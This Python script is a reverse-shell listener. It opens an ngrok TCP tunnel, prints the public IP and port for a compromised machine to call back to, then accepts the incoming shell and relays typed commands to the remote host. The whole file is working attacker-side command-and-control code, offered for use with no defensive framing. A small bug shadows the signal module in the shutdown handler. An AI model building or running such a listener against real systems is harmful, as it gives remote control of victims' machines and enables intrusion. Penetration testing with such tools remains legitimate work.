#!/usr/bin/env python3

import os
import subprocess
import requests
import json
import signal
import time
import socket
import threading

def ngrok(port):
    subprocess.Popen(["ngrok", "tcp", str(port), "--log=stdout"])

def start_listener(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('localhost', port))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f'\033[1mReverse shell connection established from {addr[0]}:{addr[1]}\033[0m')
            while True:
                cmd = input('$ncrok ')
                if cmd.lower() == 'exit':
                    break
                conn.sendall(cmd.encode() + b'\n')
                try:
                    conn.settimeout(1)
                    data = conn.recv(1024)
                    if not data:
                        break
                    print(data.decode(), end='')
                except socket.error:
                    print("Invalid command. Try again.")

def kill_processes(signal, frame):
    # Kill all child processes
    os.killpg(os.getpgid(ngrok_process.pid), signal.SIGTERM)
    exit(0)

# Get user input for port number
print("\033[1mEnter port number:\033[0m")
port = int(input())

# Start ngrok TCP server on the same port
print("\033[1mTCP tunneling using ngrok to port \033[32m{}\033[0m".format(port))
ngrok_process = subprocess.Popen(["ngrok", "tcp", str(port), "--log=stdout"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
time.sleep(5)  # Wait for ngrok to start

# Print ngrok URL
try:
    response = requests.get('http://localhost:4040/api/tunnels')
    data = response.json()
    for tunnel in data['tunnels']:
        if tunnel['proto'] == 'tcp':
            ngrok_url = tunnel['public_url']
            ngrok_domain = tunnel['public_url'].split("//")[-1].split(":")[0]
            ngrok_ip = socket.gethostbyname(ngrok_domain)
            tcp_port = tunnel['public_url'].split(":")[-1]
            print("\033[1mAccess the listener from the WAN using TCP IP address: \033[32m{}\033[0m, Port: \033[32m{}\033[0m".format(ngrok_ip, tcp_port))
            break
except requests.exceptions.RequestException as e:
    print("Failed to retrieve ngrok URL:", e)

# Start listener on specified port using a new thread
print("\033[1mStarting listener on port \033[32m{}\033[0m".format(port))
listener_thread = threading.Thread(target=start_listener, args=(port,))
listener_thread.start()

# Set trap to kill ngrok and netcat processes when script receives SIGINT signal
signal.signal(signal.SIGINT, kill_processes)

# Wait for ngrok and listener threads to finish
listener_thread.join()
ngrok_process.kill()
